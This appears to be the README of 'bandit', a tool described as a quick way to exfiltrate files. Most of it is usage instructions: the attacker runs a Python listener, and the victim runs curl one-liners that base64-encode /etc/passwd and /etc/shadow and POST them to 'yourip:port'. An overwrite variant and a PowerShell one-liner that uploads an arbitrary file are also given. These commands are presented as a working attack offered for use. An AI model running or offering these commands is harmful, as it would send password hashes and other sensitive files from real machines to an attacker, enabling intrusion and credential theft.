# bandit
A quick and easy way to exfiltrate files

# usage
Attacker: ```python3 bandit.py [port]```

Victim: ```curl -d "passwd=$(base64 /etc/passwd)&shadow=$(base64 /etc/shadow)" http://yourip:port/```

It is important to use double quotes to allow bash to process reading the files and encoding them before upload

If you wish to overwrite the existing files, instead of failing to upload if they exist on the server, specify the /overwrite path. This will scribble over any existing files on the server that conflict with the attempted upload, so use with caution. Yes, path travesal checks are made before file IO

Victim: ```curl -d "passwd=$(base64 /etc/passwd)&shadow=$(base64 /etc/shadow)" http://yourip:port/overwrite```

Bandit is also compatible with Windows Powershell, although usage is not as straightforward. To save you some time, here is a oneliner to upload a single file, filename.txt, to the remote server as uploadedfile:

```if ($PWD.Provider.Name -eq 'FileSystem') { [System.IO.Directory]::SetCurrentDirectory($PWD) } ; Invoke-WebRequest -Uri http://yourip:port -Method POST -Body @{uploadedfile=[Convert]::ToBase64String([IO.File]::ReadAllbytes("filename.txt"))}```
